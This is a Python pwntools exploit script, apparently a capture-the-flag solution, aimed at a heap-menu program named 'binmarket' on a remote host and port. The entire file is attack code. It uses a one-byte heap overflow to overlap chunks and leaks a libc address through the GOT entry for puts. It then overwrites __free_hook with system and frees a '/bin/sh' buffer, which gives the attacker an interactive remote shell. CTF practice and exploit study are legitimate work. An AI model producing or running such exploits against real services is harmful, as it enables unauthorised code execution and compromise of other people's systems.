#!/usr/bin/env python3

from pwn import *

exe = ELF("./binmarket_patched")
libc = ELF("./libc6_2.27-3ubuntu1.5_amd64.so")
ld = ELF("./ld-2.27.so")

context.binary = exe

def conn():
    r = process([exe.path])
    return r

#r = conn()
r =remote("198.211.116.222",9010)

def sl(a, b):
    r.sendlineafter(a, b)

def s(a, b):
    r.sendafter(a, b)

def alloc(index, size, name="M"):
    sl("choice: ", "1")
    sl("basket index:", str(index))
    sl("quantity : ", str(size))
    s("product name:", name)

def edit(index, data):
    sl("choice: ", "2")
    sl("Which product index:", str(index))
    s("product name:", data)

def show():
    sl("choice: ", "3")

def free(index):
    sl("choice: ", "4")
    sl("Which product index:", str(index))

def main():

    for i in range(1):
        alloc(i, 0x10, "D"*0x10)

    for i in range(1):
        free(i)

    alloc(0, 0x108)
    alloc(1, 0x108)
    alloc(2, 0x38)
    alloc(3, 0x38)

    edit(0, b"A"*0x108 + p8(0x91))
    free(1)
    alloc(4, 0x188, b"H"*0x110 + p64(exe.got['puts']))
    show()
    for i in range(2):
        r.recvuntil("== ")

    puts = u64(r.recv(6) + p16(0))
    log.warn("puts @ 0x%x", puts)

    libc.address = puts - libc.sym['puts']
    log.warn("Libc base @ 0x%x", libc.address)

    edit(4, b"H"*0x110 + p64(libc.sym.__free_hook) + p64(0x100))
    edit(2, p64(libc.sym.system))
    
    alloc(10, 0x10, "/bin/sh\x00")
    free(10)

    r.interactive()


if __name__ == "__main__":
    main()
